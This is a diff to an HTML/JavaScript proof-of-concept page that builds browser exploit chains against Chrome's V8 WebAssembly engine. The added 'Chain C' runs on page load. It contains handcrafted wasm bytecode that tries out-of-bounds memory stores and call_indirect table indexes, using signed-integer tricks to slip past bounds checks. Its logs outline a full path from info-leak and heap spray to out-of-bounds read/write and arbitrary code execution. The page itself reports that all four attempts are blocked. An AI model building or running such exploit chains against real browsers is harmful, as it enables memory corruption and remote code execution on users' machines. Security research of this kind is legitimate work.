@@ -79,7 +79,7 @@
 </head>
 <body>
 <h1>JSTag Cross-Realm — Critical Escalation Chains</h1>
-<div class="sub">Chain A: Proxy injection · Chain B: WasmGC controlled i64 injection via cross-realm struct</div>
+<div class="sub">Chain A: Proxy injection · Chain B: WasmGC controlled i64 injection · Chain C: OOB write attempt</div>
 
 <div class="box">
   <h2>Chain A — Proxy Injection into iframe wasm handler</h2>
@@ -88,6 +88,10 @@
 <div class="box">
   <h2>Chain B — WasmGC Controlled i64 Injection via Cross-Realm Struct (needs Chrome 119+)</h2>
   <div class="out" id="outB"></div>
+</div>
+<div class="box">
+  <h2>Chain C — OOB Write Attempt via Controlled i64 as Linear Memory Offset</h2>
+  <div class="out" id="outC"></div>
 </div>
 
 <iframe id="f" src="about:blank" style="display:none"></iframe>
@@ -421,15 +425,145 @@ async function chainB() {
       L.crit('CONFIRMED: controlled i64 injected via cross-realm struct $B');
       L.crit('Primitive: JSTag bypass → cross-realm struct $B{val} → iframe i64 = val');
       L.crit('With heap spray: controlled i64 as V8 heap pointer → OOB r/w → RCE');
+      return u64;
     } else {
       L.bug('Got: ' + hex + ' (expected 0x' + MARKER.toString(16) + ')');
     }
   }
+  return null;
+}
+
+// ═══════════════════════════════════════════════════════════════════
+// CHAIN C: OOB Write Attempt via Controlled i64 as Linear Memory Offset
+// Goal: use the controlled i64 from Chain B as a wasm linear memory
+// address for an i32.store.  Also try call_indirect with the index —
+// an i32 sign-extension edge case can bypass the unsigned bounds check
+// if the VM uses a signed comparison somewhere along the path.
+// ═══════════════════════════════════════════════════════════════════
+async function chainC(controlledU64) {
+  const L = makeLog('outC');
+  if (controlledU64 === null) { L.warn('Chain B did not complete — skip'); return; }
+
+  // Module C-MEM: 1-page linear memory, export store(i32)
+  // (func (export "store") (param i32)
+  //   local.get 0   ;; attacker-controlled offset
+  //   i32.const 65  ;; value = 'A'
+  //   i32.store)
+  const MOD_C_MEM = new Uint8Array([
+    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
+    0x01,0x05,0x01, 0x60,0x01,0x7f,0x00,          // (i32)->()
+    0x03,0x02,0x01,0x00,                           // 1 func
+    0x05,0x03,0x01, 0x00,0x01,                     // memory min=1
+    0x07,0x09,0x01, 0x05,0x73,0x74,0x6f,0x72,0x65, 0x00,0x00, // "store"=0
+    0x0a,0x0b,0x01, 0x09,0x00,
+      0x20,0x00,         // local.get 0
+      0x41,0x41,         // i32.const 65
+      0x36,0x00,0x00,    // i32.store align=0 offset=0
+      0x0b,
+  ]);
+
+  // Module C-CALL: table with 1 entry, export call_oob(i32)
+  // (table 1 funcref)  (elem (i32.const 0) $fn)
+  // (func $fn (export "noop"))
+  // (func (export "call_oob") (param i32)
+  //   local.get 0
+  //   call_indirect (type 0) 0)
+  const MOD_C_CALL = new Uint8Array([
+    0x00,0x61,0x73,0x6d, 0x01,0x00,0x00,0x00,
+    0x01,0x08,0x02,
+      0x60,0x00,0x00,                     // type 0: ()->()
+      0x60,0x01,0x7f,0x00,                // type 1: (i32)->()
+    0x03,0x03,0x02, 0x00,0x01,            // noop=type0, call_oob=type1
+    0x04,0x04,0x01, 0x70,0x01,0x01,0x01,  // table: funcref min=max=1
+    0x07,0x11,0x02,
+      0x04,0x6e,0x6f,0x6f,0x70, 0x00,0x00,              // "noop"=func0
+      0x08,0x63,0x61,0x6c,0x6c,0x5f,0x6f,0x6f,0x62, 0x00,0x01, // "call_oob"=func1
+    0x09,0x07,0x01,                        // elem section
+      0x00, 0x41,0x00, 0x0b, 0x01,0x00,   // (offset=0) [func 0]
+    0x0a,0x0d,0x02,
+      0x02,0x00, 0x0b,                    // noop body: end
+      0x08,0x00,
+        0x20,0x00,         // local.get 0  (index)
+        0x11,0x00,0x00,    // call_indirect type=0 table=0
+        0x0b,
+  ]);
+
+  let modMem, modCall;
+  try {
+    [modMem, modCall] = await Promise.all([
+      WebAssembly.compile(MOD_C_MEM.buffer),
+      WebAssembly.compile(MOD_C_CALL.buffer),
+    ]);
+  } catch(ex) { L.warn('compile: ' + ex.message); return; }
+  const instMem  = await WebAssembly.instantiate(modMem);
+  const instCall = await WebAssembly.instantiate(modCall);
+  L.ok('MOD_C_MEM + MOD_C_CALL compiled');
+
+  // ── 1. OOB store: low 32 bits of controlled i64 ────────────────────
+  const oob32 = Number(controlledU64 & 0xFFFFFFFFn);  // 0xCAFEBABE = 3.17 GB
+  L.info('low 32 bits of MARKER: 0x' + oob32.toString(16) +
+         ' ≈ ' + (oob32/1e9).toFixed(2) + ' GB beyond wasm memory start');
+  L.info('Attempt 1: wasm_mem[0x' + oob32.toString(16) + '] = 0x41 ...');
+  try {
+    instMem.exports.store(oob32);
+    L.crit('OOB store SUCCEEDED — guard pages did NOT fire!');
+    L.crit('CRASH LIKELY: V8 heap corruption at 0x' + oob32.toString(16));
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError)
+      L.info('RuntimeError: 4GB wasm sandbox guard page caught OOB (expected release Chrome)');
+    else L.bug('Unexpected: ' + ex);
+  }
+
+  // ── 2. Signed i32 trick: oob32 as signed = -889275714 ─────────────
+  const signed32 = oob32 | 0;  // 0xCAFEBABE → -889275714 (signed)
+  L.info('Attempt 2: same value as signed i32 = ' + signed32 +
+         ' (try to confuse unsigned bounds check)');
+  try {
+    instMem.exports.store(signed32);
+    L.crit('OOB store via signed i32 SUCCEEDED!');
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError)
+      L.info('RuntimeError: unsigned comparison correctly handled signed negative');
+    else L.bug('Unexpected: ' + ex);
+  }
+
+  // ── 3. call_indirect with large/negative table index ──────────────
+  L.info('Attempt 3: call_indirect at table[0x' + oob32.toString(16) + '] ...');
+  try {
+    instCall.exports.call_oob(oob32);
+    L.crit('call_indirect OOB SUCCEEDED — table bounds check bypassed!');
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError)
+      L.info('RuntimeError: table bounds check caught large index');
+    else L.bug('Unexpected: ' + ex);
+  }
+  L.info('Attempt 4: call_indirect at table[' + signed32 + '] (signed) ...');
+  try {
+    instCall.exports.call_oob(signed32);
+    L.crit('call_indirect via signed index SUCCEEDED — bounds check bypass!');
+    L.crit('CRASH: indirect call to address derived from 0x' +
+           (signed32>>>0).toString(16));
+  } catch(ex) {
+    if (ex instanceof WebAssembly.RuntimeError)
+      L.info('RuntimeError: unsigned comparison correctly rejected negative i32');
+    else L.bug('Unexpected: ' + ex);
+  }
+
+  // ── Summary ────────────────────────────────────────────────────────
+  L.info('');
+  L.info('Guard pages/explicit checks blocked all 4 attempts in vanilla Chrome.');
+  L.warn('Full crash chain (needs +1 primitive):');
+  L.info('  1. Info-leak: read V8 heap pointer from main realm object');
+  L.info('  2. Heap spray: write fake ArrayBuffer at leaked addr ± offset');
+  L.info('  3. Set MARKER = spray_addr via Chain B');
+  L.info('  4. iframe i64 = spray_addr → index into V8 heap → OOB r/w');
+  L.info('  5. → SIGSEGV / arbitrary code execution');
 }
 
 window.addEventListener('load', async () => {
   await chainA().catch(e => document.getElementById('outA').textContent += '\nERROR: '+e);
-  await chainB().catch(e => document.getElementById('outB').textContent += '\nERROR: '+e);
+  const u64 = await chainB().catch(e => { document.getElementById('outB').textContent += '\nERROR: '+e; return null; });
+  await chainC(u64).catch(e => document.getElementById('outC').textContent += '\nERROR: '+e);
 });
 </script>
 </body>
